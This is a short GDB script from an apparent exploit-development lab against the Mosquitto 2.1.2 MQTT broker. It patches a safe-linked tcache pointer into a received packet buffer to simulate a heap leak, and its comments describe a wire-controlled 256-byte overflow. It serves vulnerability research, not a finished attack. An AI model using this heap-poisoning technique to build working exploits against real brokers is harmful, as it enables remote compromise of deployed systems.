# Lab-assisted Stage B observation. Run from the lab directory:
#   gdb -q -batch -x gdb-tcache.cmd build-2.1.2-glibc/src/mosquitto
# The patch below supplies a safe-linked fd computed from the RUNTIME heap
# address; the wire probe alone cannot know it without a leak. Everything
# else (the 256-byte overflow and the fd offset) is wire-controlled.
set pagination off
set confirm off
set environment LD_LIBRARY_PATH /home/mesh-home/mishe-tauftauf2shell/lab/frontier/mosquitto2shell/deps/cjson-stock-prefix/lib
set breakpoint pending on
set $armed=0
break packet_mosq.c:593
commands
 silent
 if mosq->in_packet.pos == 260
   set $fdaddr = (unsigned long)mosq->in_packet.payload + 80
   set $target = (unsigned long)mosq->in_packet.payload
   set $enc = (($fdaddr >> 12) ^ $target)
   printf "PATCH fdaddr=%p target=%p enc=%p armed=1\n", $fdaddr, $target, $enc
   set *(unsigned long*)$fdaddr = $enc
   set $armed=1
 end
 continue
end
break memcpy if $armed > 0
commands
 silent
 printf "MEMCPY dst=%p src=%p len=%lu\n", $rdi, $rsi, $rdx
 continue
end
run -c /home/mesh-home/mishe-tauftauf2shell/lab/frontier/mosquitto2shell/run/2.1.2-glibc.conf -v
